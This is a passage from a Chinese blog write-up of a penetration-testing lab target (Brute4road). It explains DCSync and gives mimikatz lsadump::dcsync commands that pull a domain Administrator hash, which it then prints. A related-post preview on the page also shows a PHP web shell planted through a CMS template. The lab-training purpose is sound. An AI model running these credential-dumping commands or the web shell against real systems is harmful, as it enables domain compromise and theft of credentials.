+<p>什么是Dcsync(domain Controller synchronization)（<strong>主副域控同步</strong>）:在内网中一般不是一个域控，会有域树或者域森林等，域控之间是要<strong>同步数据</strong>的,不同的域控15分钟之间要发起一次数据同步的请求，请求里面就包含同步的数据，这里采用的协议是**DRS(目录复制服务)**，这个就是DCsync</p>
+<p><strong>简单来说就是</strong> 利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据<br><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/47.png"></p>
+<p><strong>利用条件</strong></p>
+<p><strong>要进行DCSync则必须要能够运行DRS服务，通常以下用户组可以运行DRS服务</strong></p>
+<ul>
+<li>Administrators组内的用户</li>
+<li>Domain Admins组内的用户</li>
+<li>Enterprise Admins组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<p>域控的Administrator和system也可以</p>
+</blockquote>
+<p><font style="color:rgb(218, 219, 248);background-color:rgb(20, 19, 39);"></font></p>
+<p>我们获取到了LDAP 服务的ST后，就可以与域控进行交互了，并且可以借助<a target="_blank" rel="noopener" href="https://c1trus.top/26-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8.html#_0">mimikatz</a> 进行DCSync攻击</p>
+<p>以下命令执行后，mimikatz 会尝试从域控制器同步 <code>Administrator</code> 账户的哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:xiaorang.lab /user:Administrator</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这是抓到的administrator的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1a19251fbd935969832616366ae3fe62</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/48.png"></p>
+<p>开梭</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4road/49.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/38a9b672.html">https://hundredsu.github.io/post/38a9b672.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/662902bc.html" title="reddish"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">reddish</div></div><div class="info-2"><div class="info-item-1">看佬c1trus说是很难的靶机，但是能学东西，正好最近在学docker逃逸，打一打  信息收集10.10.10.94 tscan扫端口  只开放了一个端口1880 Mongo-Express Node.js 外围打点node-red-rce访问显示这个  那么我们post看一下  12345&#123;  &quot;id&quot;: &quot;ffec0b75777a00bc6e65ff2660896ad1&quot;,  &quot;ip&quot;: &quot;::ffff:10.10.16.38&quot;,  &quot;path&quot;:...</div></div></div></a><a class="pagination-related" href="/post/6d98188.html" title="春秋云镜-certify"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">春秋云镜-certify</div></div><div class="info-2"><div class="info-item-1">https://blog.csdn.net/cyy001128/article/details/145285068 39.99.148.57 12345678910111213141516171819202122D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\未免杀5号黯区红队开发的fscan图形化和plus&gt;fscan.exe -h 39.99.148.57  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __| | |  \__ \ (_| (_| | | | | |    | | |_| \__ \ |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/                     fscan version: 1.8.4...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/633b4305.html" title="春秋云镜–Aoselu"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜–Aoselu</div></div><div class="info-2"><div class="info-item-1">春秋云镜–Aoselu39.98.116.223 赛后复盘重打 写的不好，且比较乱，师傅自行判断借鉴 参考了官方的wp和一些其他的师傅的类型的打法wp 12345678910111213141516171819202122D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.98.116.223   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 2.0.0[*] 扫描类型: all, 目标端口:...</div></div></div></a><a class="pagination-related" href="/post/bf3976cc.html" title="cyberstrikelab-lab9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">cyberstrikelab-lab9</div></div><div class="info-2"><div class="info-item-1">信息收集开局一个ip 172.5.33.6 fscan扫一下 12345678910111213141516171819202122232425262728293031D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 172.5.33.6┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘     ...</div></div></div></a><a class="pagination-related" href="/post/662902bc.html" title="reddish"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">reddish</div></div><div class="info-2"><div class="info-item-1">看佬c1trus说是很难的靶机，但是能学东西，正好最近在学docker逃逸，打一打  信息收集10.10.10.94 tscan扫端口  只开放了一个端口1880 Mongo-Express Node.js 外围打点node-red-rce访问显示这个  那么我们post看一下  12345&#123;  &quot;id&quot;: &quot;ffec0b75777a00bc6e65ff2660896ad1&quot;,  &quot;ip&quot;: &quot;::ffff:10.10.16.38&quot;,  &quot;path&quot;:...</div></div></div></a><a class="pagination-related" href="/post/bdc052b9.html" title="春秋云镜-Delegation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Delegation</div></div><div class="info-2"><div class="info-item-1">信息收集 http://39.99.128.241/ fscan直接扫  flag01 访问一下发现是cms，用poc扫一下，同时搜历史漏洞  扫出来了，但是我也搜到了其他的（具体的版本号可以登录后台后确定下来，但是也可以像这样直接探测一下）  访问admin，直接跳转 admin&#x2F;123456 直接登录成功 在模版处 修改 1&lt;?=system($_POST[a]);die();?&gt;   访问主页即可 主页会加载其他的模块内容  这里我用另一个poc 123456789101112131415POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 39.98.119.143Content-Length: 80X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...</div></div></div></a><a class="pagination-related" href="/post/47d3d323.html" title="春秋云镜-Exchange"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Exchange</div></div><div class="info-2"><div class="info-item-1">参考wp： https://www.cnblogs.com/kingbridge/articles/16720318.html https://zer0peach.github.io/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/ 开局一个ip39.99.153.253 fscan开扫 123456789101112131415161718192021222324D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 39.99.153.253┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ /...</div></div></div></a><a class="pagination-related" href="/post/a3698f4a.html" title="春秋云镜-Delivery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Delivery</div></div><div class="info-2"><div class="info-item-1">参考 还有n位师傅，就不详细记录了 https://mp.weixin.qq.com/s/jxGGwTu1TBJiH5LOVRO6pQ https://cloud.tencent.com/developer/article/1839233 https://bowuchuling.github.io/posts/chunqiu_Delivery.html 信息收集开局一个ip fscan开扫 39.99.248.209 1234567891011121314151617181920212223242526D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.99.248.209   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|  ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/b6e82410.html" title="5、并发编程">5、并发编程</a><time datetime="2025-08-07T13:57:12.000Z" title="发表于 2025-08-07 21:57:12">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/5715da98.html" title="4、函数&amp;字符串格式化&amp;条件控制&amp;结构体">4、函数&amp;字符串格式化&amp;条件控制&amp;结构体</a><time datetime="2025-08-07T13:57:10.000Z" title="发表于 2025-08-07 21:57:10">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/8b3c7b5f.html" title="3、数组与切片、指针、类型转换、字符串常用函数">3、数组与切片、指针、类型转换、字符串常用函数</a><time datetime="2025-08-07T13:57:09.000Z" title="发表于 2025-08-07 21:57:09">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/3beb5b8d.html" title="2、初始函数与基本类型">2、初始函数与基本类型</a><time datetime="2025-08-07T13:57:08.000Z" title="发表于 2025-08-07 21:57:08">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/347fb1ae.html" title="1、环境配置和编辑器使用">1、环境配置和编辑器使用</a><time datetime="2025-08-07T13:57:07.000Z" title="发表于 2025-08-07 21:57:07">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>
